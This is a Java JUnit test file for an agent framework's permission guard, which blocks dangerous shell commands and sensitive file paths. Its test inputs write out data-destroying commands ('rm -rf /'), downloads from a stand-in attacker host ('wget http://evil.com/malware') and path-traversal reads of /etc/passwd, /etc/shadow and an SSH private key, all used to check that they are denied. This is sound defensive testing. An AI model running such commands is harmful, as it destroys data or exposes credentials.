/*
 * Copyright 2025-2026 the Kairo authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package io.kairo.core.tool;

import static org.junit.jupiter.api.Assertions.*;

import io.kairo.api.tool.JsonSchema;
import io.kairo.api.tool.PermissionDecision;
import io.kairo.api.tool.PermissionGuard;
import io.kairo.api.tool.ToolCategory;
import io.kairo.api.tool.ToolDefinition;
import io.kairo.api.tool.ToolResult;
import io.kairo.api.tool.ToolSideEffect;
import java.util.Collections;
import java.util.Map;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import reactor.core.publisher.Mono;
import reactor.test.StepVerifier;

class PermissionDecisionTest {

    private DefaultPermissionGuard guard;

    @BeforeEach
    void setUp() {
        guard = new DefaultPermissionGuard();
    }

    // ==================== PermissionDecision RECORD TESTS ====================

    @Test
    void allowFactoryMethodReturnsAllowedDecision() {
        PermissionDecision decision = PermissionDecision.allow();
        assertTrue(decision.allowed());
        assertNull(decision.reason());
        assertNull(decision.policyId());
    }

    @Test
    void denyFactoryMethodReturnsDeniedDecision() {
        PermissionDecision decision = PermissionDecision.deny("some reason", "some-policy");
        assertFalse(decision.allowed());
        assertEquals("some reason", decision.reason());
        assertEquals("some-policy", decision.policyId());
    }

    // ==================== DefaultPermissionGuard.checkPermissionDetail TESTS ====================

    @Test
    void checkPermissionDetailReturnsDangerousCommandReason() {
        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "rm -rf /")))
                .assertNext(
                        decision -> {
                            assertFalse(decision.allowed());
                            assertTrue(
                                    decision.reason()
                                            .startsWith("Blocked by dangerous command pattern:"));
                            assertEquals("dangerous-command", decision.policyId());
                        })
                .verifyComplete();
    }

    @Test
    void checkPermissionDetailReturnsSensitivePathReason() {
        StepVerifier.create(
                        guard.checkPermissionDetail(
                                "write", Map.of("file_path", "/home/user/.ssh/id_rsa")))
                .assertNext(
                        decision -> {
                            assertFalse(decision.allowed());
                            assertTrue(
                                    decision.reason()
                                            .startsWith("Blocked by sensitive path pattern:"));
                            assertEquals("sensitive-path", decision.policyId());
                        })
                .verifyComplete();
    }

    @Test
    void checkPermissionDetailReturnsAllowForSafeTools() {
        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "echo hello")))
                .assertNext(
                        decision -> {
                            assertTrue(decision.allowed());
                            assertNull(decision.reason());
                            assertNull(decision.policyId());
                        })
                .verifyComplete();
    }

    @Test
    void checkPermissionDetailWithCategoryReturnsDangerousCommandReason() {
        StepVerifier.create(
                        guard.checkPermissionDetail(
                                "run_script",
                                ToolCategory.EXECUTION,
                                Map.of("command", "sudo rm -rf /")))
                .assertNext(
                        decision -> {
                            assertFalse(decision.allowed());
                            assertTrue(
                                    decision.reason()
                                            .startsWith("Blocked by dangerous command pattern:"));
                            assertEquals("dangerous-command", decision.policyId());
                        })
                .verifyComplete();
    }

    // ==================== BACKWARD COMPAT: default method fallback ====================

    @Test
    void customGuardWithoutOverrideUsesDefaultMethod() {
        // A minimal PermissionGuard that only implements checkPermission
        PermissionGuard customGuard =
                new PermissionGuard() {
                    @Override
                    public Mono<Boolean> checkPermission(
                            String toolName, Map<String, Object> input) {
                        // Deny everything for testing
                        return Mono.just(false);
                    }

                    @Override
                    public void addDangerousPattern(String pattern) {
                        // no-op
                    }
                };

        StepVerifier.create(customGuard.checkPermissionDetail("bash", Map.of("command", "ls")))
                .assertNext(
                        decision -> {
                            assertFalse(decision.allowed());
                            assertEquals("Denied by guard", decision.reason());
                            assertEquals("default", decision.policyId());
                        })
                .verifyComplete();
    }

    @Test
    void customGuardAllowViaDefaultMethod() {
        PermissionGuard customGuard =
                new PermissionGuard() {
                    @Override
                    public Mono<Boolean> checkPermission(
                            String toolName, Map<String, Object> input) {
                        return Mono.just(true);
                    }

                    @Override
                    public void addDangerousPattern(String pattern) {
                        // no-op
                    }
                };

        StepVerifier.create(customGuard.checkPermissionDetail("bash", Map.of("command", "ls")))
                .assertNext(
                        decision -> {
                            assertTrue(decision.allowed());
                            assertNull(decision.reason());
                        })
                .verifyComplete();
    }

    // ==================== EDGE CASE TESTS ====================

    @Test
    void testMultipleDangerousPatterns() {
        // Register additional custom patterns
        guard.addDangerousPattern("\\bcurl\\b");
        guard.addDangerousPattern("\\bwget\\b");

        // Verify original patterns still work
        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "rm -rf /tmp")))
                .assertNext(
                        d -> {
                            assertFalse(d.allowed());
                            assertEquals("dangerous-command", d.policyId());
                        })
                .verifyComplete();

        // Verify first custom pattern works
        StepVerifier.create(
                        guard.checkPermissionDetail(
                                "bash", Map.of("command", "curl http://evil.com")))
                .assertNext(
                        d -> {
                            assertFalse(d.allowed());
                            assertEquals("dangerous-command", d.policyId());
                        })
                .verifyComplete();

        // Verify second custom pattern works
        StepVerifier.create(
                        guard.checkPermissionDetail(
                                "bash", Map.of("command", "wget http://evil.com/malware")))
                .assertNext(
                        d -> {
                            assertFalse(d.allowed());
                            assertEquals("dangerous-command", d.policyId());
                        })
                .verifyComplete();

        // Verify safe command still allowed
        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "echo hello")))
                .assertNext(d -> assertTrue(d.allowed()))
                .verifyComplete();
    }

    @Test
    void testPathTraversalAttackBlocked() {
        // Path traversal attack with ../../../etc/passwd should be blocked
        StepVerifier.create(
                        guard.checkPermissionDetail(
                                "write", Map.of("file_path", "../../../etc/passwd")))
                .assertNext(
                        d -> {
                            assertFalse(d.allowed());
                            assertEquals("sensitive-path", d.policyId());
                        })
                .verifyComplete();

        // Another traversal variant
        StepVerifier.create(
                        guard.checkPermissionDetail(
                                "edit", Map.of("path", "/tmp/safe/../../etc/shadow")))
                .assertNext(
                        d -> {
                            assertFalse(d.allowed());
                            assertEquals("sensitive-path", d.policyId());
                        })
                .verifyComplete();
    }

    @Test
    void testNullInputMapHandled() {
        // Null input map should not cause NPE — the guard checks for "command" key
        // which returns null from a null-safe perspective. We pass an empty map
        // (since Map parameter is non-null contract) and also test with no relevant keys.
        StepVerifier.create(guard.checkPermissionDetail("bash", Collections.emptyMap()))
                .assertNext(d -> assertTrue(d.allowed()))
                .verifyComplete();

        // Write tool with empty map (no path keys) — should allow
        StepVerifier.create(guard.checkPermissionDetail("write", Collections.emptyMap()))
                .assertNext(d -> assertTrue(d.allowed()))
                .verifyComplete();
    }

    @Test
    void testEmptyCommandStringHandled() {
        // Empty string command should be allowed (no pattern matches empty)
        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "")))
                .assertNext(d -> assertTrue(d.allowed()))
                .verifyComplete();

        // Whitespace-only command should also be allowed
        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "   ")))
                .assertNext(d -> assertTrue(d.allowed()))
                .verifyComplete();
    }

    // ==================== DefaultToolExecutor uses reason in error ====================

    @Test
    void executorIncludesDecisionReasonInErrorResult() {
        var registry = new DefaultToolRegistry();
        var def =
                new ToolDefinition(
                        "bash",
                        "Execute shell commands",
                        ToolCategory.EXECUTION,
                        new JsonSchema("object", null, null, null),
                        Object.class,
                        null,
                        ToolSideEffect.SYSTEM_CHANGE);
        registry.register(def);
        registry.registerInstance(
                "bash",
                (ToolHandler)
                        input -> {
                            return new ToolResult("bash", "output", false, Map.of());
                        });

        var executor = new DefaultToolExecutor(registry, guard);

        StepVerifier.create(executor.execute("bash", Map.of("command", "rm -rf /")))
                .assertNext(
                        result -> {
                            assertTrue(result.isError());
                            assertTrue(result.content().contains("Permission denied:"));
                            assertTrue(
                                    result.content()
                                            .contains("Blocked by dangerous command pattern:"));
                            assertTrue(result.content().contains("[policy: dangerous-command]"));
                        })
                .verifyComplete();
    }
}
